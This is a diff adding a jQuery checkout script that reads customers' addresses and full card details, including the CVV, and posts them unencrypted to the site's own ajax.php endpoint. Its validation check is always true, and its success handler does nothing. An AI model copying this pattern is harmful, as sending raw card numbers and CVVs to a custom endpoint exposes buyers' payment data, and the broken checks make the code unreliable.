@@ -1,0 +1,70 @@
+$(document).ready(function() {
+    const checkoutForm = $('#js-checkout-form');
+    
+    checkoutForm.on('submit', function(event) {
+        event.preventDefault();
+
+        const orderSpinner = $('#order-spinner'),
+            orderComplete = $('#order-complete'),
+            paymentButton = $('#payment_button');
+
+        orderSpinner.removeClass('hidden');
+        orderComplete.addClass('hidden');
+
+        const actionType = 'payment',
+            nameSurname = $('#name_surname').val(),
+            phoneNumber = $('#phone_number').val(),
+            emailAddress = $('#email_address').val(),
+            city = $('#city').val(),
+            district = $('#district').val(),
+            address = $('#address').val(),
+            cardholderName = $('#cardholder_name').val(),
+            cardNumber = $('#card_number').val(),
+            cardMonth = $('#card_month').val(),
+            cardYear = $('#card_year').val(),
+            cardCvv = $('#card_cvv').val(),
+            amount = checkoutForm.attr('data-amount');
+
+        const formData = {
+            action: actionType,
+            name_surname: nameSurname,
+            phone_number: phoneNumber,
+            email_address: emailAddress,
+            city: city,
+            district: district,
+            address: address,
+            cardholder_name: cardholderName,
+            card_number: cardNumber,
+            card_month: cardMonth,
+            card_year: cardYear,
+            card_cvv: cardCvv,
+            amount: amount
+        };
+
+        if (formData) {
+            $.ajax({
+                url: '/sadece-online-ozel/ajax.php',
+                method: 'POST',
+                data: JSON.stringify(formData),
+                contentType: 'application/json',
+                success: function(response) {
+                    response = JSON.parse(response);
+                    if (response.status === true) {
+                        setTimeout(function() {
+                        }, 2000);
+                    } else {
+                        alert(response.message);
+                        orderSpinner.addClass('hidden');
+                        orderComplete.removeClass('hidden');
+                        paymentButton.attr('disabled', false);
+                    }
+                }
+            });
+        } else {
+            alert('Lütfen teslimat/ödeme bilgilerinizi eksiksiz doldurunuz.');
+            orderSpinner.addClass('hidden');
+            orderComplete.removeClass('hidden');
+            paymentButton.attr('disabled', false);
+        }
+    });
+});
